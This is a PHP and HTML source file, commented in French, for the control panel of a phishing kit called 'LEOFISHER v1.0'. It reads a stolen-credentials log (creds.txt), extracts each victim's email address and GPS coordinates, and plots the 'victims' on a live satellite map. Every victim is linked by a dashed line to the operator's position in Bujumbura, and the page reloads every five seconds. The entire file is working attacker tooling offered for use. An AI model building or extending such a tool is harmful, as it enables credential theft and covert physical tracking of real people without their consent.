<?php
date_default_timezone_set('Africa/Bujumbura');
$creds_file = 'creds.txt';
$victims = [];

// Parseur PRO - extrait TOUS GPS + infos depuis logs ASCII
if (file_exists($creds_file)) {
    $logs = file_get_contents($creds_file);
    $entries = explode("┌─[ LEOFISHER v1.0 by Léo Falcon ]", $logs);

    foreach ($entries as $entry) {
        if (preg_match('/📍 GPS POSITION : ([-+]?\d+\.\d+),([-+]?\d+\.\d+)/', $entry, $gps_match)) {
            if (preg_match('/📧 .*? : (.*?)\n/', $entry, $email_match)) {
                $email = trim($email_match[1]);
                $lat = floatval($gps_match[1]);
                $lng = floatval($gps_match[2]);
                if ($lat != 0 && $lng != 0 && abs($lat) < 90 && abs($lng) < 180) { // Valid GPS
                    $victims[] = [
                        'lat' => $lat,
                        'lng' => $lng,
                        'email' => $email,
                        'ip' => 'N/A', // Extract if needed
                        'time' => date('H:i:s')
                    ];
                }
            }
        }
    }
}

// Coordonnées OPÉRATEUR Bujumbura (toi)
$op_lat = -3.361378;
$op_lng = 29.359912;
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>ARIENS MILITARY GPS TRACKER - LEOFISHER v1.0</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Leaflet + Plugins PRO -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css" />
    <style>
        /* DESIGN MILITAIRE PRO */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', monospace; 
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
            color: #00ff41; 
            overflow: hidden; 
        }
        #map { height: 100vh; width: 100%; border: 3px solid #00ff41; box-shadow: 0 0 50px rgba(0,255,65,0.5); }
        
        /* HEADER MILITAIRE */
        .military-header {
            position: absolute; top: 0; left: 0; right: 0; 
            background: rgba(0,15,30,0.98); 
            padding: 20px; 
            border-bottom: 4px solid #00ff41; 
            box-shadow: 0 0 30px rgba(0,255,65,0.6);
            z-index: 1001; 
            text-align: center;
        }
        .title { 
            font-size: 28px; font-weight: bold; text-transform: uppercase; 
            letter-spacing: 4px; text-shadow: 0 0 15px #00ff41; 
        }
        .subtitle { font-size: 14px; opacity: 0.8; margin-top: 5px; }
        
        /* DASHBOARD STATS */
        .dashboard { 
            position: absolute; top: 120px; left: 20px; 
            background: rgba(0,20,40,0.95); 
            padding: 20px; 
            border: 2px solid #00ff41; 
            border-radius: 8px; 
            z-index: 1000; 
            min-width: 250px;
            box-shadow: 0 0 25px rgba(0,255,65,0.4);
        }
        .stats { font-size: 14px; margin: 8px 0; line-height: 1.4; }
        .victim-count { color: #ff4444 !important; font-weight: bold; font-size: 20px; text-shadow: 0 0 10px #ff4444; }
        
        /* BOUTONS ZOOM MILITAIRES */
        .zoom-controls { 
            position: absolute; top: 120px; right: 20px; 
            background: rgba(0,20,40,0.95); 
            padding: 20px; 
            border: 2px solid #00ff41; 
            border-radius: 8px; 
            z-index: 1000;
            box-shadow: 0 0 25px rgba(0,255,65,0.4);
        }
        .zoom-btn { 
            background: linear-gradient(45deg, #00ff41, #00cc33); 
            color: #000; border: none; padding: 12px 16px; margin: 4px 0; 
            cursor: pointer; font-weight: bold; border-radius: 6px; width: 100%; 
            font-family: 'Courier New', monospace; font-size: 13px;
            box-shadow: 0 4px 15px rgba(0,255,65,0.4);
            transition: all 0.3s;
        }
        .zoom-btn:hover { 
            background: linear-gradient(45deg, #00cc33, #00ff41); 
            transform: translateY(-2px); 
            box-shadow: 0 6px 20px rgba(0,255,65,0.6);
        }
        
        /* MARKERS MILITAIRES */
        .op-marker { animation: op-pulse 1.5s infinite; }
        .victim-marker { animation: victim-pulse 2s infinite; }
        @keyframes op-pulse {
            0%, 100% { box-shadow: 0 0 0 0 rgba(255,255,0,0.7); }
            50% { box-shadow: 0 0 0 15px rgba(255,255,0,0); }
        }
        @keyframes victim-pulse {
            0%, 100% { box-shadow: 0 0 0 0 rgba(255,68,68,0.8); transform: scale(1); }
            50% { box-shadow: 0 0 0 20px rgba(255,68,68,0); transform: scale(1.2); }
        }
        
        /* LÉGENDE */
        .legend {
            position: absolute; bottom: 20px; right: 20px;
            background: rgba(0,20,40,0.95); padding: 15px; border: 2px solid #00ff41;
            border-radius: 8px; font-size: 12px; z-index: 1000;
            box-shadow: 0 0 20px rgba(0,255,65,0.4);
        }
    </style>
</head>
<body>
    <!-- HEADER MILITAIRE -->
    <div class="military-header">
        <div class="title">ARIENS MILITARY GPS TRACKER</div>
        <div class="subtitle">LEOFISHER v1.0 by Léo Falcon | Live Operational Tracking 2025</div>
    </div>

    <div id="map"></div>

    <!-- TES DASHBOARD STATS (design militaire) -->
    <div class="dashboard">
        <div class="stats"><strong>🚨 LEOFISHER GPS DASH PRO</strong></div>
        <div class="stats victim-count">🎯 Victimes: <span id="victimCount">0</span></div>
        <div class="stats">📍 Opérateur: Bujumbura (-3.36, 29.36)</div>
        <div class="stats">🛰️ Satellite: Esri WorldImagery HD (Zoom 22)</div>
        <div class="stats">🔄 Auto-refresh: 5s</div>
    </div>

    <!-- TES BOUTONS ZOOM (design militaire) -->
    <div class="zoom-controls">
        <button class="zoom-btn" onclick="map.setZoom(map.getZoom() + 1)">🔍 ZOOM +</button>
        <button class="zoom-btn" onclick="map.setZoom(map.getZoom() - 1)">🔎 ZOOM -</button>
        <button class="zoom-btn" onclick="map.fitBounds(bounds)">📐 FIT ALL</button>
    </div>

    <!-- LÉGENDE MILITAIRE -->
    <div class="legend">
        🟡 OP Command | 🔴 Pulsing Victims<br>
        📏 Distances KM | 🛰️ Satellite HD | 🔄 Live 5s
    </div>

    <!-- Leaflet JS + Plugins (inchangé) -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>

    <script>
        let map, markers = L.markerClusterGroup({ spiderfyOnMaxZoom: true, showCoverageOnHover: true, zoomToBoundsOnClick: true });
        let bounds = L.latLngBounds();
        const opLat = <?php echo $op_lat; ?>;
        const opLng = <?php echo $op_lng; ?>;
        const victims = <?php echo json_encode($victims); ?>;

        // SATELLITE MILITAIRE HD (inchangé)
        const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
            attribution: '© Esri WorldImagery 2025 HD',
            maxZoom: 22,
            minZoom: 1
        });

        const roads = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap',
            opacity: 0.7,
            maxZoom: 22
        });

        map = L.map('map', {
            layers: [satellite, roads],
            zoomControl: false,
            minZoom: 1,
            maxZoom: 22
        }).setView([opLat, opLng], 10);

        // OP MARKER MILITAIRE (jaune pulsant)
        const opMarker = L.marker([opLat, opLng], {
            icon: L.divIcon({
                className: 'op-marker',
                html: '<div style="background:#ffaa00;color:#000;font-weight:bold;border-radius:50%;width:35px;height:35px;line-height:35px;text-align:center;font-size:12px;box-shadow:0 0 20px #ffaa00">OP</div>',
                iconSize: [35, 35]
            })
        }).addTo(map).bindPopup('<b>🚨 OPÉRATEUR Bujumbura</b><br>Position fixe');
        bounds.extend([opLat, opLng]);

        // VICTIMES MARKERS MILITAIRES (rouges pulsants + routes)
        victims.forEach((victim, index) => {
            const victimMarker = L.marker([victim.lat, victim.lng], {
                icon: L.divIcon({
                    className: 'victim-marker',
                    html: `<div style="background:#ff4444;color:#fff;border-radius:50%;width:30px;height:30px;line-height:30px;text-align:center;font-weight:bold;font-size:11px;box-shadow:0 0 25px #ff4444">#${index+1}</div>`,
                    iconSize: [30, 30]
                })
            }).addTo(map).bindPopup(`
                <div style="font-family: monospace; color: #ff4444;">
                    <h3>🎯 VICTIME #${index+1}</h3>
                    <strong>📧 Email:</strong> ${victim.email}<br>
                    <strong>📍 GPS:</strong> ${victim.lat.toFixed(6)}, ${victim.lng.toFixed(6)}<br>
                    <strong>🕒 Time:</strong> ${victim.time}
                </div>
            `);

            markers.addLayer(victimMarker);
            bounds.extend([victim.lat, victim.lng]);
            
            // ROUTE OP → VICTIME (ligne rouge dashed)
            L.polyline([[opLat, opLng], [victim.lat, victim.lng]], {
                color: '#ff4444', weight: 4, opacity: 0.8, dashArray: '15 10'
            }).addTo(map);
        });

        map.addLayer(markers);
        if (bounds.isValid()) map.fitBounds(bounds);

        // Distance Haversine PRO (inchangé)
        function haversine(lat1, lon1, lat2, lon2) {
            const R = 6371;
            const dLat = (lat2 - lat1) * Math.PI / 180;
            const dLon = (lon2 - lon1) * Math.PI / 180;
            const a = Math.sin(dLat/2) * Math.sin(dLat/2) + Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.sin(dLon/2) * Math.sin(dLon/2);
            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
            return R * c;
        }

        // Update stats (inchangé)
        document.getElementById('victimCount').textContent = victims.length;

        // Auto-refresh PRO 5s (inchangé)
        setInterval(() => { location.reload(); }, 5000);
    </script>
</body>
</html>
